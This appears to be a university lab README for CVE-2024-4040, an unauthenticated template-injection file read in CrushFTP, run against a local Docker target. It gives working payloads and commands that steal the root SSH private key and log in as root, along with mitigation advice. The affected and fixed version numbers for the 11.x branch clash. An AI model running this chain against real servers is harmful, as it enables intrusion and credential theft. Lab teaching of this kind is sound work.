# CVE-2024-4040 — CrushFTP SSTI / LFI Proof of Concept

> **For educational and authorised lab use only.**  
> CS443 Software and Systems Security — controlled local Docker environment.

---

## Vulnerability Summary

| Field | Detail |
|---|---|
| **CVE** | CVE-2024-4040 |
| **Affected Software** | CrushFTP ≤ 10.7.0 / ≤ 11.1.0 |
| **Vulnerability Type** | Server-Side Template Injection (SSTI) → Unauthenticated Local File Read |
| **CVSS Score** | 9.8 Critical |
| **Impact** | Unauthenticated attackers can read arbitrary files from the server filesystem |

CrushFTP's `WebInterface` evaluates template expressions in the `path` parameter of the `zip` command without sanitisation. An unauthenticated attacker can obtain anonymous session cookies, then use those cookies to pass template payloads (`{working_dir}`, `<INCLUDE>…</INCLUDE>`) that the server evaluates and returns — allowing arbitrary file read across the host.

---

## Lab Environment

| Component | Value |
|---|---|
| Target | `http://localhost:8080` |
| CrushFTP Version | 10.3.0 (intentionally vulnerable) |
| SSH Port (container) | `2222 → 22` |
| Admin Credentials | `admin / admin` |
| Container Runtime | Docker (Compose) |

---

## Prerequisites

```bash
pip install requests rich
```

---

## Scripts

| Script | Source | Purpose |
|---|---|---|
| `crushed.py` | [Stuub/CVE-2024-4040-SSTI-LFI-PoC](https://github.com/Stuub/CVE-2024-4040-SSTI-LFI-PoC) | Full SSTI/LFI exploit — session steal, arbitrary file read |
| `recon.py` | This repo | Version detection, live SSTI probe, vulnerability confirmation |

---

## Proof of Concept Walkthrough

### Step 1 — Start the Lab

```bash
docker-compose up -d
```

Wait ~10 seconds for CrushFTP to fully initialise before running the scripts.

---

### Step 2 — Run Recon to Confirm Vulnerability

```bash
python recon.py -t http://localhost:8080
```

Expected output confirms:
- CrushFTP version is below the patched threshold
- Live SSTI probe evaluates successfully (template is not returned literally)
- Verdict: **VULNERABLE — run crushed.py**

---

### Step 3 — Steal SSH Private Key via LFI

```bash
python crushed.py -t http://localhost:8080 -l /root/.ssh/id_rsa
```

The script will:
1. Obtain an anonymous `CrushAuth` / `currentAuth` session from `/WebInterface/`
2. Use SSTI to confirm template evaluation and leak the server hostname
3. Use `{working_dir}` to resolve the CrushFTP installation directory
4. Use `<INCLUDE>/root/.ssh/id_rsa</INCLUDE>` to read the target file
5. Print the raw file contents to stdout

Copy the private key block from the output (everything from `-----BEGIN OPENSSH PRIVATE KEY-----` to `-----END OPENSSH PRIVATE KEY-----`).

---

### Step 4 — Save the Stolen Key

```bash
cat > stolen_id_rsa << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
<paste key from output>
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 stolen_id_rsa
```

---

### Step 5 — SSH into the Container as Root

```bash
ssh -i stolen_id_rsa root@localhost -p 2222 -o StrictHostKeyChecking=no
```

---

### Step 6 — Confirm Root Access

```bash
whoami
# Expected: root

id
# Expected: uid=0(root) gid=0(root) groups=0(root)

hostname
# Expected: <container_id>
```

---

## Attack Chain Diagram

```
Unauthenticated attacker
        │
        ▼
GET /WebInterface/          ← obtains anonymous CrushAuth + currentAuth cookies
        │
        ▼
POST /WebInterface/function/
  ?command=zip
  &path={hostname}          ← SSTI confirmed — template evaluated by server
        │
        ▼
POST /WebInterface/function/
  ?command=zip
  &path={working_dir}       ← leaks absolute installation path
        │
        ▼
POST /WebInterface/function/
  ?command=zip
  &path=<INCLUDE>/root/.ssh/id_rsa</INCLUDE>   ← arbitrary file read
        │
        ▼
SSH -i stolen_id_rsa root@localhost -p 2222    ← full root shell
```

---

## Key Known Issues in crushed.py

| Issue | Location | Details |
|---|---|---|
| Missing dependency | Line 6–9 | Requires `pip install rich` before running |
| Brittle XML parsing | Lines 86, 140 | Crashes on non-XML server responses; no `ParseError` handling |
| Token regex too strict | Lines 160–161 | `CrushAuth=…; currentAuth=…` pattern may not match all `sessions.obj` formats |
| HTTP 404 only | Line 53 | Cookie grab only succeeds on 404; falls through silently on other status codes |

---

## Mitigation

- Upgrade CrushFTP to **≥ 10.7.1** (v10 branch) or **≥ 11.1.0** (v11 branch)
- Enable the DMZ network isolation option if available
- Rotate all session material and credentials after any suspected exploitation
- Review access logs for requests to `/WebInterface/function/` with `<INCLUDE>` or `{` patterns in the `path` parameter
